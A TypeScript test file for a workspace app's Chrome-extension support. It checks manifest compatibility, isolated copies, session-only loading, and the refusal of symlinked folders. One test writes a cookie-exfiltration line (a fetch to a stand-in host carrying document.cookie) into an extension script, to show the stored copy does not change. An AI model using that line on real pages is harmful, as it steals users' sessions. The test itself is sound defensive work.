// Chrome extensions in the Bloks browser (GitHub 510): what an unpacked
// extension is and what of it works here, said before it is added; a
// copy kept beside the workspace; and loading into the workspace
// browser's own session and never another, the app's included.
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";

import {
  COPIES_DIR,
  addFromFolder,
  compatibility,
  inspectFolder,
  listView,
  loadInto,
  readBrowserExtension,
  readList,
  removeExtension,
  setEnabled,
} from "../electron/browser-extensions.mjs";

function unpacked(root: string, name: string, manifest: Record<string, unknown>) {
  const dir = join(root, name);
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, "manifest.json"), JSON.stringify(manifest));
  writeFileSync(join(dir, "content.js"), "document.body.dataset.seen = '1'");
  return dir;
}

/** A session that records what was loaded into it. */
function fakeSession(name: string) {
  const loaded: string[] = [];
  const removed: string[] = [];
  const options: unknown[] = [];
  return {
    name,
    loaded,
    removed,
    options,
    extensions: {
      async loadExtension(path: string, opts?: unknown) {
        loaded.push(path);
        options.push(opts);
        return { id: `id-${loaded.length}` };
      },
      removeExtension(id: string) {
        removed.push(id);
      },
    },
  };
}

const passwordManager = {
  manifest_version: 3,
  name: "__MSG_appName__",
  default_locale: "en",
  version: "2026.10.1",
  permissions: ["storage", "tabs", "scripting", "nativeMessaging", "contextMenus", "alarms"],
  host_permissions: ["<all_urls>"],
  action: { default_popup: "popup/index.html" },
  background: { service_worker: "background.js" },
  content_scripts: [{ matches: ["<all_urls>"], js: ["content.js"] }],
  options_ui: { page: "options.html" },
};

test("what an extension is, and what of it works here, is said before it is added", (t) => {
  const root = mkdtempSync(join(tmpdir(), "bloks-bext-"));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const pm = unpacked(root, "vault", passwordManager);
  mkdirSync(join(pm, "_locales", "en"), { recursive: true });
  writeFileSync(join(pm, "_locales", "en", "messages.json"), JSON.stringify({ appName: { message: "Vault Manager" } }));
  const info = readBrowserExtension(pm);
  assert.equal(info.name, "Vault Manager");
  assert.equal(info.manifestVersion, 3);
  assert.deepEqual(info.hosts, ["<all_urls>"]);
  assert.equal(info.popup, true);
  const fit = compatibility(info);
  assert.equal(fit.verdict, "unlikely", "a popup and native messaging are how a password manager is unlocked");
  assert.ok(fit.works.includes("Its scripts on the pages it lists"));
  assert.ok(fit.works.includes("Its background service worker"));
  assert.ok(fit.works.includes("chrome.storage"));
  const missing = fit.missing.join("\n");
  assert.match(missing, /native messaging/);
  assert.match(missing, /toolbar button and popup/);
  assert.match(missing, /right-click menu/);
  assert.match(missing, /chrome\.alarms/);
  assert.match(missing, /options page/);

  const simple = unpacked(root, "simple", { manifest_version: 3, name: "Dark pages", version: "1.0", permissions: ["storage"], content_scripts: [{ matches: ["https://*/*"], js: ["content.js"] }] });
  assert.deepEqual(compatibility(readBrowserExtension(simple)), { verdict: "works", works: ["Its scripts on the pages it lists", "chrome.storage"], missing: [] });

  const odd = unpacked(root, "odd", { manifest_version: 3, name: "Odd", version: "1", permissions: ["somethingNew"] });
  assert.equal(compatibility(readBrowserExtension(odd)).verdict, "partly");
  assert.match(compatibility(readBrowserExtension(odd)).missing[0], /somethingNew permission, which Electron does not list as supported/);

  assert.throws(() => readBrowserExtension(root), /no manifest\.json/);
  const named = unpacked(root, "hidden-name", { manifest_version: 3, name: "Real‮ name", version: "1" });
  assert.equal(readBrowserExtension(named).name, "Real name");
});

test("it is copied in, loaded into the workspace browser's session only, and taken out again", async (t) => {
  const root = mkdtempSync(join(tmpdir(), "bloks-bext-"));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const dataDir = join(root, "workspace");
  mkdirSync(dataDir);
  const src = unpacked(root, "dark", { manifest_version: 3, name: "Dark pages", version: "1.0", content_scripts: [{ matches: ["https://*/*"], js: ["content.js"] }] });

  const entry = addFromFolder(dataDir, src, 1);
  assert.ok(entry.dir.startsWith(join(dataDir, COPIES_DIR)), "a copy beside the workspace");
  assert.equal(readFileSync(join(entry.dir, "content.js"), "utf8"), "document.body.dataset.seen = '1'");
  // a change to the folder afterwards changes nothing that runs
  writeFileSync(join(src, "content.js"), "fetch('https://example.com/' + document.cookie)");
  assert.equal(readFileSync(join(entry.dir, "content.js"), "utf8"), "document.body.dataset.seen = '1'");
  assert.equal(readList(dataDir).length, 1);

  const browserSession = fakeSession("persist:bloks-browser-personal");
  const appSession = fakeSession("default");
  await loadInto(browserSession, dataDir);
  assert.deepEqual(browserSession.loaded, [entry.dir]);
  assert.deepEqual(browserSession.options, [{ allowFileAccess: false }], "never file:// pages");
  assert.deepEqual(appSession.loaded, [], "the app's own session is never given one");

  await setEnabled(browserSession, dataDir, entry.slug, false);
  assert.deepEqual(browserSession.removed, ["id-1"]);
  const reload = fakeSession("persist:bloks-browser-personal");
  await loadInto(reload, dataDir);
  assert.deepEqual(reload.loaded, [], "switched off stays off across a restart");
  await setEnabled(reload, dataDir, entry.slug, true);
  assert.deepEqual(reload.loaded, [entry.dir]);

  const view = listView(dataDir);
  assert.equal(view[0].name, "Dark pages");
  assert.equal(view[0].compatibility?.verdict, "works");

  removeExtension(reload, dataDir, entry.slug);
  assert.deepEqual(reload.removed, ["id-1"]);
  assert.equal(existsSync(entry.dir), false);
  assert.deepEqual(readList(dataDir), []);
});

test("a folder with a link in it is refused, and a saved list cannot make removal delete anything but its copies", (t) => {
  const root = mkdtempSync(join(tmpdir(), "bloks-bext-"));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const dataDir = join(root, "workspace");
  mkdirSync(dataDir);
  const src = unpacked(root, "linky", { manifest_version: 3, name: "Linky", version: "1" });
  symlinkSync("/etc/hosts", join(src, "hosts.txt"));
  assert.throws(() => inspectFolder(src), /is a link/);
  assert.throws(() => addFromFolder(dataDir, src), /is a link/);
  assert.equal(existsSync(join(dataDir, COPIES_DIR)) && readList(dataDir).length > 0, false);

  // a list edited to point somewhere else: the entry goes, the folder stays
  const precious = join(root, "precious");
  mkdirSync(precious);
  writeFileSync(join(precious, "keep.txt"), "mine");
  writeFileSync(join(dataDir, "browser-extensions.json"), JSON.stringify({ extensions: [{ slug: "x", dir: precious, from: precious, name: "X", version: "1", enabled: true, addedAt: 1 }] }));
  removeExtension(null, dataDir, "x");
  assert.equal(readFileSync(join(precious, "keep.txt"), "utf8"), "mine");
});

test("the app loads extensions into the workspace browser's partition and nowhere else", () => {
  // The wiring is main.mjs's, which needs Electron to run; its shape is
  // what can be held here. loadExtension is called by the module alone,
  // the module is handed the browser's own session, and the bridge for
  // it answers only the app's page.
  const main = readFileSync(new URL("../electron/main.mjs", import.meta.url), "utf8");
  assert.doesNotMatch(main, /loadExtension\s*\(/, "main.mjs never loads one itself");
  assert.match(main, /const ses = session\.fromPartition\(partitionFor\(id\)\);[\s\S]{0,600}browserExtensions\.loadInto\(ses, ws\.dataDir/);
  assert.doesNotMatch(main, /browserExtensions\.\w+\(\s*session\.defaultSession/);
  assert.doesNotMatch(main, /defaultSession\.(extensions|loadExtension)/);
  for (const channel of ["list", "pick", "add", "set-enabled", "remove"]) {
    assert.match(main, new RegExp(`handle\\("browser-extensions:${channel}"`), `${channel} goes through handle, the app's page only`);
  }
  assert.match(main, /pickedExtensionFolders\.has\(dir\)/, "a folder only as the owner picked it");
});
